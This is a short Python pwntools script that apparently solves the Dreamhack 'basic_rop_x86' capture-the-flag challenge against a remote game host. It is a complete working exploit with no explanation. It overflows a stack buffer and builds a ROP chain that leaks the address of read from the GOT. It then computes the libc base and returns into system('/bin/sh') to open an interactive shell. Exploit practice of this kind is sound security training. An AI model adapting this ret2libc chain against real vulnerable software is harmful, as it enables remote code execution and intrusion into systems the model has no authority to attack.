from pwn import *
from pwn import p64
from pwn import u64
from pwn import p32
from pwn import u32

p=remote('host3.dreamhack.games',9953)
e = ELF('./a/basic_rop_x86')
libc = ELF('./a/libc.so.6')
context.log_level = 'debug'

read_plt = 0x080483f0
read_got = 0x804a00c
write_plt = 0x08048450
pppr = 0x8048689
main = 0x080485d9
pr = 0x80483d9

payload = b'\x90'*0x48
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(main)

#pause()
p.sendline(payload)

print(p.recv(0x40))
leak = u32(p.recv(4))
print("leak : 0x%x" %leak)

base = leak - libc.symbols['read']
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))

payload = b'\x90'*0x48
payload += p32(system)
payload += p32(pr)
payload += p32(binsh)

p.sendline(payload)
p.interactive()